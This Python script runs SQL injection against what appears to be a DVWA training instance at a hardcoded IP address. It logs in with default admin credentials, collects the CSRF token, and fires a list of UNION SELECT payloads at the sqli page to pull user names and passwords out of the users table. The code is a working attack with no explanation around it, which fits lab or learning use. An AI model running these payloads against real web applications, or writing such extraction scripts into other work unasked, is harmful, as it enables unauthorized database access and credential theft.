
import requests
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

url_base = "http://31.97.117.123"
session = requests.Session()

# Login
login_url = f"{url_base}/login.php"
response = session.get(login_url, verify=False)
token_match = re.search(r"name='user_token'\s+value='([^']+)'", response.text)
user_token = token_match.group(1)

payload = {
    "username": "admin",
    "password": "password",
    "user_token": user_token,
    "Login": "Login"
}

response = session.post(login_url, data=payload, verify=False, allow_redirects=True)
print("[+] Logged in successfully\n")

sqli_url = f"{url_base}/vulnerabilities/sqli/"

print("[*] Using comment techniques to bypass the closing quote...\n")

# Query: SELECT first_name, last_name FROM users WHERE user_id = '$id';
# When $id = -1' UNION SELECT ... -- , the query becomes:
# SELECT first_name, last_name FROM users WHERE user_id = '-1' UNION SELECT ... -- ';

payloads = [
    # Basic UNION with comment
    "-1' UNION SELECT 1,2 #",
    # Try without the closing quote
    "-1 UNION SELECT 1,2 #",
    # Try SELECT *
    "-1' UNION SELECT *,* FROM users #",
    # With all columns
    "-1' UNION SELECT user_id, user_name FROM users #",
    "-1' UNION SELECT user_name, user_password FROM users #",
]

for payload_str in payloads:
    print(f"[*] Trying: {payload_str}")
    response = session.get(sqli_url, params={"id": payload_str, "Submit": "Submit"}, verify=False)
    
    # Extract the pre section
    pre_match = re.search(r'<pre>(.*?)</pre>', response.text, re.DOTALL)
    if pre_match:
        result_text = pre_match.group(1)
        if "error" not in result_text.lower() and "syntax" not in result_text.lower():
            print(f"    [+] Result:\n{result_text}\n")
        else:
            # Show first part
            print(f"    [-] Error: {result_text[:150]}\n")

